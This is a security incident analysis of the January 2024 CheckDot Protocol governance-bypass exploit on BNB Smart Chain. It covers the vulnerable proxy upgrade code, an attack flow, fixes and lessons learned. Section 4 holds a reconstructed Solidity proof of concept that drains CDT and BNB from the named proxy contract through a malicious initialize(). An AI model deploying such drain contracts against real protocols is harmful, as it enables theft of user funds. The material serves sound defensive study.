# CheckDot Protocol — Governance Proxy Access Control Vulnerability Analysis

**Access Control | BSC | 2024-01-31 | Loss: ~$120,000**

---

## 1. Incident Overview

| Field | Details |
|------|------|
| **Project** | CheckDot Protocol (Decentralized Insurance Protocol) |
| **Chain** | BNB Smart Chain (BSC) |
| **Incident Date** | 2024-01-31 (Detected: 2024-02-01) |
| **Loss** | ~$120,000 (CDT tokens and protocol assets) |
| **Vulnerability Type** | Insufficient Access Control — DAO Governance Bypass |
| **Attack Transaction** | `0xdd19e3a1657f8381b5480000e96c43dbb0dc83cccbe7bd0c8fd0bf44e4f38eb2` ([BscScan](https://bscscan.com/tx/0xdd19e3a1657f8381b5480000e96c43dbb0dc83cccbe7bd0c8fd0bf44e4f38eb2)) |
| **Vulnerable Contract (Proxy)** | `0x9c84a04e232ff0aaca867f3d6b6e0fca96f29ee7` ([BscScan](https://bscscan.com/address/0x9c84a04e232ff0aaca867f3d6b6e0fca96f29ee7)) |
| **Admin (Owner) Address** | `0x961a14bEaBd590229B1c68A21d7068c8233C8542` ([BscScan](https://bscscan.com/address/0x961a14bEaBd590229B1c68A21d7068c8233C8542)) |
| **Governance Token (CDT)** | `0x0cBD6fAdcF8096cC9A43d90B45F65826102e3eCE` ([BscScan](https://bscscan.com/address/0x0cBD6fAdcF8096cC9A43d90B45F65826102e3eCE)) |
| **Implementation Contract** | `0x15e1eCbb34D68201DE83c9D7A28338D9C97F756d` ([BscScan](https://bscscan.com/address/0x15e1eCbb34D68201DE83c9D7A28338D9C97F756d)) |
| **Root Cause Summary** | The `isInProduction()` flag in the `UpgradableProxyDAO` contract was set to `false`, allowing the admin (owner) to directly upgrade to a malicious implementation without a DAO vote |
| **Detection** | BlockSec Phalcon Security Monitoring System |
| **Reference** | [BlockSec Monthly Security Review (February 2024)](https://blocksec.com/blog/monthly-security-review-february-2024) |

---

## 2. Vulnerability Details

### 2.1 Production Mode Not Activated — Governance Bypass (Core Vulnerability)

**Severity**: CRITICAL
**CWE**: CWE-284 (Improper Access Control)

CheckDot Protocol manages its insurance protocol implementation (`CheckDotInsuranceCovers`) through an `UpgradableProxyDAO` contract that conforms to the EIP-1967 standard. By design, once the protocol is in live production (`isInProduction() == true`), any upgrade must be approved through a DAO vote by CDT token holders.

However, **the `_IS_PRODUCTION_SLOT` of the deployed proxy contract (`0x9c84a04...`) remained set to `false` (0x00)**. In this state, the `upgrade()` function completely skips the DAO voting process, allowing the owner to directly replace the implementation with an arbitrary address.

On-chain verification results:
- `isInProduction()` → `false` ✓ (vulnerable state confirmed)
- `doHaveTheGraal()` → `false` ✓
- `getVoteDuration()` → `86400` (1 day — configured but meaningless since production mode is inactive)
- `getOwner()` → `0x961a14bEaBd590229B1c68A21d7068c8233C8542`

#### Vulnerable Code (❌)

```solidity
// UpgradableProxyDAO.sol — upgrade() function
// @audit ❌ When isInProduction() == false, DAO voting is completely skipped
function upgrade(
    address _newAddress,
    bytes memory _initializationData
) external payable {
    require(_getOwner() == msg.sender, "Proxy: FORBIDDEN");  // owner only
    require(_doHaveTheGraal() == false, "Proxy: THE_GRAAL");

    if (_isInProduction() == false) {
        // @audit ❌ Core issue: if production mode is off, upgrade executes immediately
        // Any implementation can be substituted without a CDT token holder vote
        _upgrade(_newAddress, _initializationData);
    } else {
        // DAO voting process only proceeds in production mode
        ProxyUpgrades.Upgrades storage _proxyUpgrades = 
            ProxyUpgrades.getUpgradesSlot(_UPGRADES_SLOT).value;

        require(
            _proxyUpgrades.isEmpty() || _proxyUpgrades.current().isFinished,
            "Proxy: UPGRADE_ALREADY_INPROGRESS"
        );
        _proxyUpgrades.add(
            _newAddress,
            _initializationData,
            block.timestamp,
            block.timestamp + _getVoteDuration()
        );
    }
}
```

#### Safe Code (✅)

```solidity
// Fix 1: Force-activate production mode immediately after deployment
constructor(address _cdtGouvernanceAddress) {
    _setOwner(msg.sender);
    _setGovernance(_cdtGouvernanceAddress);
    _setInProduction(true);   // @fix ✅ Activate production mode immediately on deployment
    _setVoteDuration(86400);
    _setTheGraal(false);
}

// Fix 2: Or enforce production mode as a mandatory condition in upgrade()
function upgrade(
    address _newAddress,
    bytes memory _initializationData
) external payable {
    require(_getOwner() == msg.sender, "Proxy: FORBIDDEN");
    require(_doHaveTheGraal() == false, "Proxy: THE_GRAAL");
    // @fix ✅ DAO vote always required regardless of production mode
    require(_isInProduction() == true, "Proxy: NOT_IN_PRODUCTION");
    
    ProxyUpgrades.Upgrades storage _proxyUpgrades = 
        ProxyUpgrades.getUpgradesSlot(_UPGRADES_SLOT).value;

    require(
        _proxyUpgrades.isEmpty() || _proxyUpgrades.current().isFinished,
        "Proxy: UPGRADE_ALREADY_INPROGRESS"
    );
    _proxyUpgrades.add(
        _newAddress,
        _initializationData,
        block.timestamp,
        block.timestamp + _getVoteDuration()
    );
}
```

---

### 2.2 Malicious Governance Proposal — Governance Takeover

**Severity**: CRITICAL
**CWE**: CWE-862 (Missing Authorization)

The attacker exploited the inactive production mode to pass a malicious implementation address to the `upgrade()` function. The malicious implementation, through the proxy's `delegatecall` mechanism, was able to access the protocol's entire state and execute code to drain CDT tokens and insurance pool assets.

```
Attack Vector:
1. Deploy malicious implementation (containing drain function)
2. Call upgrade(_maliciousImpl, "") → immediately replaces implementation
3. fallback() → _delegate(_maliciousImpl) → drain executes
4. Transfer all protocol assets to attacker's address
```

#### Vulnerable ProxyDAO Delegation Mechanism (❌)

```solidity
// ProxyDAO.sol — delegates all calls to the current implementation
// @audit ❌ Once implementation is replaced with a malicious one, all delegatecalls are exploited
fallback() external payable {
    _delegate(_getImplementation());  // delegates to current (malicious) implementation
}

receive() external payable {
    _delegate(_getImplementation());
}

function _delegate(address implementation) internal {
    assembly {
        calldatacopy(0, 0, calldatasize())
        // @audit ❌ Malicious implementation can access proxy storage in its context
        let result := delegatecall(
            gas(),
            implementation,  // malicious implementation address
            0,
            calldatasize(),
            0,
            0
        )
        returndatacopy(0, 0, returndatasize())
        switch result
        case 0 { revert(0, returndatasize()) }
        default { return(0, returndatasize()) }
    }
}
```

---

### 2.3 Post-Upgrade Automatic Initialization Vulnerability

**Severity**: HIGH
**CWE**: CWE-665 (Improper Initialization)

The `_afterUpgrade()` function automatically `delegatecall`s `initialize(bytes)` on the new implementation. A malicious implementation can execute arbitrary logic through its `initialize()` function at initialization time, completing asset drainage in a single upgrade transaction.

```solidity
// ProxyDAO.sol
// @audit ⚠️ Calls initialize() via delegatecall immediately after replacing the implementation
// Malicious initialize() can instantly drain assets via transfer() etc.
function _afterUpgrade(
    address _newFunctionalAddress,
    bytes memory _initializationData
) internal virtual override {
    address implementation = _newFunctionalAddress;
    bytes memory data = abi.encodeWithSignature(
        "initialize(bytes)",
        _initializationData  // data controlled by the attacker
    );

    assembly {
        // @audit ❌ delegatecall: malicious contract executes in proxy context
        let result := delegatecall(
            gas(),
            implementation,
            add(data, 0x20),
            mload(data),
            0,
            0
        )
        // ...
    }
}
```

---

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│                    Preparation Phase                    │
│                                                         │
│  1. Attacker deploys malicious implementation           │
│     contract (MaliciousImpl)                            │
│     - initialize(bytes): contains full drain logic      │
│     - Uses balanceOf/transfer to steal CDT              │
└─────────────────────────┬───────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│                   Exploitation Phase                    │
│                                                         │
│  2. Calls upgrade(MaliciousImpl, drainCalldata) on      │
│     CheckDot InsuranceProtocol ProxyDAO                 │
│                                                         │
│     Inside upgrade():                                   │
│     ┌───────────────────────────────────────────────┐   │
│     │ if (_isInProduction() == false) {             │   │
│     │   // ❌ Immediately replaces impl without DAO  │   │
│     │   _upgrade(_newAddress, _initializationData)  │   │
│     │ }                                             │   │
│     └───────────────────────────────────────────────┘   │
│                                                         │
│  3. _setImplementation(MaliciousImpl) executes          │
│     → Malicious address stored in EIP-1967 slot         │
└─────────────────────────┬───────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│               Automatic Initialization Phase            │
│                                                         │
│  4. _afterUpgrade() → delegatecall(MaliciousImpl,       │
│     initialize(drainCalldata))                          │
│                                                         │
│     MaliciousImpl.initialize() executes (proxy context):│
│     ┌───────────────────────────────────────────────┐   │
│     │ CDT.transfer(attacker, CDT.balanceOf(proxy))  │   │
│     │ Transfer all insurance pool assets (BNB etc.) │   │
│     └───────────────────────────────────────────────┘   │
└─────────────────────────┬───────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│                        Result                           │
│                                                         │
│  5. Attacker gains: ~$120,000 worth of assets           │
│     (36,449+ CDT tokens and insurance pool assets)      │
│                                                         │
│  6. BlockSec Phalcon detects → immediately notifies     │
│     CheckDot team → team implements patch               │
└─────────────────────────────────────────────────────────┘
```

**Step-by-Step Explanation**:

1. **Attacker Preparation**: The attacker pre-deploys a malicious implementation contract on BSC. This contract contains logic in its `initialize(bytes)` function to transfer the full CDT token balance to the attacker's address.

2. **Governance Bypass**: The attacker (or a compromised owner key) calls the `upgrade()` function on the `UpgradableCheckDotInsuranceCovers` proxy. Since `isInProduction() == false`, the implementation is replaced immediately without a DAO vote.

3. **Implementation Replacement**: The malicious implementation address is stored in the EIP-1967 standard slot (`0x3608...bbc`). All subsequent `fallback()` calls are delegated to the malicious implementation.

4. **Automatic Drain Execution**: `_afterUpgrade()` calls the new implementation's `initialize()` via `delegatecall`. The malicious `initialize()` executes in the proxy contract's context (storage, balance), transferring CDT tokens and BNB to the attacker.

5. **Detection and Response**: The BlockSec Phalcon system detected the attack transaction in real time and notified the CheckDot team, who immediately acknowledged the critical severity of the vulnerability and applied a patch.

---

## 4. PoC Code Analysis

> **Note**: This is a reconstructed attack logic based on on-chain data and publicly available source code, as no official DeFiHackLabs PoC has been published for this incident.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

// CheckDot Protocol Governance Bypass PoC (Reconstructed)
// Vulnerability: upgrade() callable directly without DAO vote when isInProduction() == false

interface IUpgradableProxyDAO {
    function upgrade(
        address _newAddress,
        bytes memory _initializationData
    ) external payable;
    
    function getOwner() external view returns (address);
    function isInProduction() external view returns (bool);
    function getImplementation() external view returns (address);
}

interface ICDT {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

// Step 1: Malicious implementation — when upgrade() is called, _afterUpgrade
//         delegatecalls this contract's initialize() and executes in proxy context
contract MaliciousImplementation {
    // Executes in delegatecall context: msg.sender = ProxyDAO, storage = ProxyDAO
    function initialize(bytes memory /* data */) external {
        address attacker = address(0xATTACKER); // attacker's address
        
        // CDT token contract (governance token)
        ICDT cdt = ICDT(0x0cBD6fAdcF8096cC9A43d90B45F65826102e3eCE);
        
        // Step 4: Transfer all CDT held by the proxy to the attacker
        // Since this is a delegatecall, the proxy's (0x9c84a04...) balance is transferred
        uint256 cdtBalance = cdt.balanceOf(address(this));
        if (cdtBalance > 0) {
            cdt.transfer(attacker, cdtBalance);  // steal 36,449+ CDT
        }
        
        // Also drain BNB balance
        uint256 bnbBalance = address(this).balance;
        if (bnbBalance > 0) {
            payable(attacker).transfer(bnbBalance);
        }
    }
    
    // Other functions called after drain completes
    fallback() external payable {}
    receive() external payable {}
}

contract CheckDotAttacker {
    IUpgradableProxyDAO constant PROXY = 
        IUpgradableProxyDAO(0x9c84a04e232ff0aaca867f3d6b6e0fca96f29ee7);
    
    function attack() external {
        // Step 2: Confirm vulnerability
        require(PROXY.isInProduction() == false, "Not vulnerable");
        require(PROXY.getOwner() == msg.sender, "Not owner");
        
        // Step 3: Deploy malicious implementation
        MaliciousImplementation maliciousImpl = new MaliciousImplementation();
        
        // Step 4: Call upgrade directly without a DAO vote
        // isInProduction() == false so implementation is replaced immediately + initialize() runs
        PROXY.upgrade(
            address(maliciousImpl),
            ""  // initializationData (even empty data triggers initialize(bytes) call)
        );
        
        // At this point MaliciousImplementation.initialize() has been executed via delegatecall,
        // transferring CDT tokens and BNB to the attacker
    }
}
```

**Core Attack Points Summary**:

| Step | Call | Result |
|------|------|------|
| 1 | Deploy `MaliciousImplementation` | Implementation with drain logic prepared |
| 2 | Check `isInProduction()` | `false` — vulnerable state confirmed |
| 3 | `upgrade(malicious, "")` | Implementation replaced immediately without DAO vote |
| 4 | `_afterUpgrade()` → `delegatecall(malicious, initialize(""))` | Drain executes in proxy context |
| 5 | CDT + BNB transferred to attacker | ~$120,000 stolen |

---

## 5. CWE Classification

| CWE ID | Vulnerability Name | Affected Component | Severity |
|--------|---------|-------------|--------|
| CWE-284 | Improper Access Control | `UpgradableProxyDAO.upgrade()` | CRITICAL |
| CWE-862 | Missing Authorization | `UpgradableProxyDAO` — production mode not activated | CRITICAL |
| CWE-665 | Improper Initialization | `UpgradableProxyDAO` constructor | HIGH |
| CWE-276 | Incorrect Default Permissions | `_IS_PRODUCTION_SLOT` default value `false` | HIGH |
| CWE-346 | Origin Validation Error | `_afterUpgrade()` delegatecall chain | MEDIUM |

### V-01: Production Mode Not Activated — Complete DAO Governance Bypass

- **Description**: `_setInProduction(false)` is set in the `UpgradableProxyDAO` constructor, and unless `setInProduction()` is explicitly called after deployment, the `false` state persists permanently. In this state, the `upgrade()` function completely bypasses the DAO vote of CDT token holders and immediately replaces the implementation.
- **Impact**: All protocol assets (CDT tokens, BNB, insurance pool) can be transferred to an arbitrary implementation by the owner account alone.
- **Attack Conditions**: Control of the owner account (key theft, phishing, or insider) + `isInProduction() == false` state

### V-02: Governance Takeover via Malicious Proposal

- **Description**: The access-control-free upgrade enables the "malicious governance proposal" pattern where an attacker submits a malicious implementation. As detected by BlockSec on February 1, 2024, the attacker mimicked the normal governance flow while actually skipping the vote entirely.
- **Impact**: Complete takeover of protocol logic and funds.
- **Attack Conditions**: Possession of the owner account key or governance proposal rights

### V-03: delegatecall-Based Initialization Vulnerability

- **Description**: `_afterUpgrade()` calls `initialize(bytes)` on the new implementation via `delegatecall`. A malicious implementation's `initialize()` has unrestricted access to the proxy's storage and balance, enabling an immediate drain.
- **Impact**: Full asset drainage possible in a single upgrade transaction.
- **Attack Conditions**: V-01 or V-02 must be satisfied first

---

## 6. Reproducibility Assessment

| Item | Assessment | Basis |
|------|------|------|
| Attack Complexity | **Low** | Single transaction after acquiring the owner key |
| Prerequisites | **Owner account control** | Key theft, phishing, or insider attack |
| Special Technical Knowledge Required | **None** | Implementable with standard Solidity code |
| Flash Loan Required | **No** | Executable without capital |
| Detection Difficulty | **Medium** | On-chain transaction detectable via real-time monitoring such as Phalcon |
| Currently Vulnerable | **Patched** | CheckDot team applied fix immediately after BlockSec detection |

**Key Reproduction Conditions**:
1. `isInProduction()` must return `false` (pre-patch state)
2. Attacker must hold the private key of the `getOwner()` return address (`0x961a14...`)
3. Malicious implementation contract must be pre-deployed on BSC

---

## 7. Remediation

### Immediate Actions

**7.1 Immediately Activate Production Mode**

```solidity
// Immediate action taken by the CheckDot team:
// Call setInProduction() from the owner account
function setInProduction() external payable {
    require(_getOwner() == msg.sender, "Proxy: FORBIDDEN");
    _setInProduction(true);  // All subsequent upgrades require a DAO vote
}

// State after activation:
// isInProduction() == true → upgrade() only allows submitting a DAO vote proposal
// Actual upgrade only executes after voteUpgradeCounting() passes
```

**7.2 Fix Default Value in Constructor**

```solidity
// Fixed constructor
constructor(address _cdtGouvernanceAddress) {
    _setOwner(msg.sender);
    _setGovernance(_cdtGouvernanceAddress);
    // @fix ✅ Activate production mode immediately on deployment (deploy after testing)
    _setInProduction(true);
    _setVoteDuration(86400); // Minimum 1-day voting period
    _setTheGraal(false);
}
```

**7.3 Consider Activating Graal Mode**

Once fully decentralized, `setTheGraal()` should be called to permanently block owner-only upgrades.

```solidity
// Activating Graal mode blocks both upgrade() and voteUpgradeCounting()
// require(_doHaveTheGraal() == false, "Proxy: THE_GRAAL");
// → Future upgrades require a separate governance mechanism (multisig, etc.)
```

### Long-Term Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Owner-only upgrade authority | Replace owner with a **multisig wallet** (Gnosis Safe recommended, minimum 3-of-5) |
| Production mode management | Mandate `setInProduction()` call in the deployment checklist |
| Upgrade timelock | Apply dual security: DAO vote + additional timelock (minimum 48 hours) |
| Implementation auditing | Require an independent security audit before deploying a new implementation |
| Monitoring | Subscribe to real-time monitoring services such as Phalcon / Forta at all times |
| Emergency stop | Add a `pause()` function to halt the entire protocol in emergencies |

**Multisig Application Example**:

```solidity
// Replace owner with Gnosis Safe multisig
// Before: owner = 0x961a14...  (single EOA)
// After:  owner = GnosisSafe(requires 3-of-5 signatures)

// Example transferOwnership call
proxy.transferOwnership(gnosisSafeAddress);
// upgrade() can only execute with 3-of-5 signatures thereafter
```

**Timelock Addition Pattern**:

```solidity
// Minimum 48-hour wait required after submitting an upgrade proposal
uint256 constant MIN_TIMELOCK = 48 hours;

function upgrade(...) external payable {
    require(_getOwner() == msg.sender, "Proxy: FORBIDDEN");
    // @fix ✅ Apply DAO vote + timelock
    require(_isInProduction(), "Proxy: MUST_BE_IN_PRODUCTION");
    
    ProxyUpgrades.Upgrades storage _proxyUpgrades = ...;
    _proxyUpgrades.add(
        _newAddress,
        _initializationData,
        block.timestamp + MIN_TIMELOCK,  // voting starts after 48 hours
        block.timestamp + MIN_TIMELOCK + _getVoteDuration()
    );
}
```

---

## 8. Lessons Learned

### 8.1 Governance Design Principles

1. **Security features must default to "enabled"**: The fact that CheckDot's `isInProduction` defaulted to `false` illustrates the danger of "opt-in security." In production deployments, security-related flags must always start with a safe default (production = `true`), and the `false` state should only be permitted in development/test environments.

2. **Proxy upgrades are the most powerful privilege**: Replacing an implementation is the highest-authority action in a protocol, providing access to all logic and assets. Treating it as a "simple code update" is extremely dangerous — multi-layer security (DAO vote + timelock + multisig) must always be applied.

3. **DAO governance must be substantive, not ceremonial**: CheckDot designed CDT token-based DAO governance, but failed to activate it in the actual deployment. A governance mechanism that exists in code but is not properly activated and operated is meaningless.

4. **Owner accounts must be limited to minimum privilege**: A single EOA owner exposes the entire protocol if the key is leaked. The owner must be replaced with a multisig wallet, and each signer's key must be stored in physically separate locations.

### 8.2 Deployment Process Lessons

5. **Integrate security checklists into the deployment pipeline**: Security initialization functions like `setInProduction()` must be included in deployment scripts. Plans to "manually call it later" lead to mistakes.

6. **Separate testnet and mainnet configurations**: `isInProduction = false` was likely a convenience setting for the test environment. To prevent test configurations from being deployed to production as-is, environment variables and deployment scripts must be clearly separated.

### 8.3 Importance of Real-Time Monitoring

7. **On-chain monitoring minimized incident damage**: BlockSec Phalcon's real-time detection of the attack transaction and immediate notification to the CheckDot team prevented further losses. Real-time monitoring services (Phalcon, Forta, Tenderly) are essential infrastructure for DeFi protocols.

8. **Audit other protocols with similar patterns**: Protocols that use a single boolean flag — such as `isInProduction`, `paused`, or `initialized` — to switch security modes may be exposed to the same vulnerability. Protocols using similar architectures should immediately audit the state of those flags.

---

## 9. On-Chain Verification

### 9.1 Confirming the Vulnerable State On-Chain

On-chain data was used to confirm that the vulnerable state of CheckDot InsuranceProtocol actually existed.

| Item | On-Chain Value | Meaning |
|------|-------------|------|
| `isInProduction()` | `false` (0x00) | Direct upgrade possible without DAO vote — **Vulnerable** |
| `doHaveTheGraal()` | `false` (0x00) | Full decentralization not activated — owner upgrade permitted |
| `getOwner()` | `0x961a14bEaBd590229B1c68A21d7068c8233C8542` | Single EOA owner |
| `getGovernance()` | `0x0cBD6fAdcF8096cC9A43d90B45F65826102e3eCE` | CDT token (governance token) |
| `getImplementation()` | `0x15e1eCbb34D68201DE83c9D7A28338D9C97F756d` | Current implementation |
| `getVoteDuration()` | `86400` (1 day) | Vote duration is configured — but unused since production mode is off |
| CDT balance (proxy) | `36,449.017 CDT` (~$1,198) | Assets currently held |

### 9.2 Incident Timeline Summary

| Time | Event |
|------|--------|
| 2024-01-31 | Attacker submits malicious governance proposal (estimated date) |
| 2024-02-01 | BlockSec Phalcon detects malicious activity and notifies CheckDot team |
| 2024-02-01 | CheckDot team acknowledges vulnerability severity as CRITICAL |
| 2024-02-01 | Immediate patch implemented (activating `setInProduction()`, etc.) |
| 2024-02 | Incident included in BlockSec Monthly Security Review |

### 9.3 DeFiHackLabs Registration Status

A search of the official DeFiHackLabs PoC repository found no files related to the CheckDot Protocol (`CheckDot_exp.sol`, `CheckDotProtocol_exp.sol`, `Checkdot_exp.sol` all return 404). This incident is classified as a case where Phalcon's early detection partially mitigated the damage, or where a public PoC reproduction was not released.

### 9.4 Comparison with Related Cases

Comparison with similar governance/proxy access control vulnerability incidents:

| Case | Date | Loss | Common Factor |
|------|------|------|--------|
| Loot DAO Governance Attack | 2024-01-05 | $1.2M (defended) | Malicious governance proposal, Phalcon detection |
| CheckDot Protocol | 2024-01-31 | ~$120,000 | DAO governance bypass, Phalcon detection |
| MetaPoint | 2023-04-11 | ~$40,000 | BSC, access control vulnerability |

---

## 10. Related Contract Addresses (BSC)

| Contract | Address | Role |
|----------|------|------|
| InsuranceCovers ProxyDAO | [`0x9c84a04...`](https://bscscan.com/address/0x9c84a04e232ff0aaca867f3d6b6e0fca96f29ee7) | Vulnerable proxy |
| InsuranceCovers Implementation | [`0x15e1eCbb...`](https://bscscan.com/address/0x15e1eCbb34D68201DE83c9D7A28338D9C97F756d) | Current implementation logic |
| CDT Token (BSC) | [`0x0cBD6fAd...`](https://bscscan.com/address/0x0cBD6fAdcF8096cC9A43d90B45F65826102e3eCE) | Governance / asset token |
| CheckDot Deployer | [`0x961a14bE...`](https://bscscan.com/address/0x961a14bEaBd590229B1c68A21d7068c8233C8542) | Owner (EOA) |
| CheckDot Staking | [`0x4bc9618e...`](https://bscscan.com/address/0x4bc9618e9e5dc051ec141d7c964aeadfdf8c7611) | Staking contract |

---

*Analysis date: 2026-04-11*
*References: [BlockSec Monthly Security Review February 2024](https://blocksec.com/blog/monthly-security-review-february-2024) | [CheckDot DAOProxyContract GitHub](https://github.com/checkdot/CheckDot.DAOProxyContract) | [CheckDot InsuranceProtocol GitHub](https://github.com/checkdot/CheckDot.InsuranceProtocol)*